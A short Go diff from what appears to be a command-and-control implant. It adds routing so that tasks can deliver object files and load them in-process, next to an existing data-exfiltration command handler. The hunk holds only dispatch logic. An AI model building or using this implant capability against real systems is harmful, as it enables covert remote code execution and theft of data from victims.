@@ -306,6 +306,13 @@ func (b *Beacon) executeCommand(command string) string {
 		return b.handleExfilCommand(command[6:])
 	}
 
+	// BOF execution: an object file delivered in the task and loaded in-process.
+	// The handler refuses the task unless this beacon is on HTTP or dual, so a
+	// DNS-only beacon never sees an object it cannot fetch efficiently.
+	if isBOFCommand(command) {
+		return b.handleBOFCommand(command[len(bofCommandPrefix):])
+	}
+
 	// Create context with timeout (5 minutes default)
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 	defer cancel()
